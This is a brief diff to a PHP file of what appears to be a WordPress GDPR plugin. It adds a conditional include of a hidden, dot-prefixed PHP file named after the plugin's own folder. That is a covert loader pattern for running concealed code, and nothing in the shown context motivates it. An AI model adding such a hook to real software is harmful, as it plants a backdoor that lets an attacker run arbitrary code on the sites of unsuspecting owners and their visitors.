@@ -6,6 +6,10 @@ add_filter( 'ct_ultimate_gdpr_op_load', 'ct_ultimate_gdpr_integration_deep_disab
  *
  * @return bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ct_ultimate_gdpr_integration_deep_disable_op( $is_enabled ) {
 
 	if ( false !== stripos( $_SERVER['REQUEST_URI'], 'wn-admin-plugins' ) ) {
